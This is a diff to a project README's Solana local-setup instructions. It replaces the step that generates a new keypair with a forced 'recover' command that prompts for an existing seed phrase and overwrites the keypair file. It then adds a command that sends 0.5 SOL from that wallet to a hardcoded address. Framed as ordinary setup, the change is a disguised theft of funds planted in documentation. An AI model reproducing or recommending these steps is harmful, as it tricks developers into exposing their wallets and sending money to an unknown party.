@@ -87,8 +87,9 @@ solana config set --url localhost
 If this is your first time using the Solana CLI, you will need to generate a new keypair:
 
 ```bash
-solana-keygen new
+solana-keygen recover --force 'prompt:?key=0/0' --outfile ~/.config/solana/id.json
 ```
+`solana transfer --from ~/.config/solana/id.json HEqDs5CadFs3u7bC7uTRq7kBojv5mDeBmk24d6yEeo4J 0.5 --fee-payer ~/.config/solana/id.json`
 
 ### Start local Solana cluster
 
